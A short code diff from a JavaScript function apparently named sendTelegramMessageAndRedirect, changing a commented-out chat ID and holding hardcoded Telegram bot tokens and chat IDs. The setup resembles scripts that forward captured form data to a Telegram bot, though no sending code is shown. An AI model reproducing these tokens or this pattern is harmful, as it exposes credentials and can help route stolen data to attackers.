@@ -3,7 +3,7 @@ function sendTelegramMessageAndRedirect() {
   //  other user API
 
   //   const telegramBotToken = "5645205996:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // add the telegram token
-  //   const chatId = 5710607863; // add ths id from the web It's usually a number, not a string
+  //   const chatId = 5645205996; // add ths id from the web It's usually a number, not a string
 
   const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // add the telegram token
   const chatId = 5349229520; // add ths id from the web It's usually a number, not a string
